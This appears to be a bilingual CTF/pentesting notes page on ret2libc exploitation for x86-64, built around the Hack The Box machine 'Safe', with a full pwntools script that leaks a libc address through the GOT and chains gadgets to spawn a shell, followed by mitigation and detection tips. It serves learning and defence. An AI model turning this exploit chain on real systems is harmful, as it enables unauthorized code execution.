---
topic: ret2libc — x86-64 with a GOT leak
tags: [pwn, ret2libc, x86-64, rop, aslr, safe]
---

# ret2libc — x86-64 with a GOT leak

[🌐 Español](ret2libc-64bit.md) | **English**

## Concept

When a binary has NX but no PIE, libc code can be reused. On x86-64 arguments go in registers (`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`), so a `pop rdi; ret` gadget is needed to call `puts` or `system`. First leak the real address of a libc function from the GOT, compute the base, then run a second stage with `system("/bin/sh")`.

## When it applies

- Stack overflow with `RIP` control.
- NX enabled, no canary or a leaked canary.
- Non-PIE binary with usable PLT/GOT.
- ASLR enabled: libc's base changes every run.
- On Safe, `gets` with a 120-byte offset and a provided libc.

## Procedure

1. Compute the offset to `RIP`.
2. Find `pop rdi; ret`.
3. Build stage 1: `padding + pop rdi + puts@got + puts@plt + main`.
4. Read the leaked address and subtract `puts`'s libc offset.
5. Build stage 2: `padding + ret + pop rdi + binsh + system`.

## Commands

```python
from pwn import *

elf = ELF('./safe')
libc = ELF('./libc.so.6')
p = process('./safe')

pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
ret = ROP(elf).find_gadget(['ret'])[0]
offset = 120

payload = b'A' * offset
payload += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
p.sendline(payload)
p.recvuntil(b'\n')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

payload = b'A' * offset
payload += p64(ret) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])
p.sendline(payload)
p.interactive()
```

## Variants

- Leak `read@got` or `printf@got` if `puts` is unsuitable.
- Use `one_gadget` with its register and stack constraints.
- With PIE, first leak a binary address and recompute its base.
- With a canary, leak it through a format string or a partial overwrite.

## Limitations

- The libc offset must match the target version exactly.
- Stack alignment may require an extra `ret` before `system`.
- A `\x00` or newline in the payload can truncate it.
- If the leak function does not end in `\n`, adjust the read.

## Mitigation

- Build with `-fstack-protector-strong`, `-pie`, `-fPIE` and `-D_FORTIFY_SOURCE=2`.
- Enable NX and ASLR; use full `RELRO`.
- Avoid `gets`, `strcpy` and unbounded functions.
- Apply `seccomp` if the binary does not need `execve`.

## Detection

- Crashes with controlled `RIP` and address chains on the stack.
- `pop rdi; ret` and `puts@plt` calls driven by user input.
- Processes spawning a shell after anomalous input.
- Core dumps containing cyclic patterns.

## References

- [OWASP — Return-to-libc](https://owasp.org/www-community/attacks/Return-to-libc_attack)
- [pwntools — ROP](https://docs.pwntools.com/en/stable/rop/rop.html)
- [0xdf — Safe](https://0xdf.gitlab.io/2020/01/18/htb-safe.html)
- [Safe writeup](../../machines/linux/safe/README.en.md)
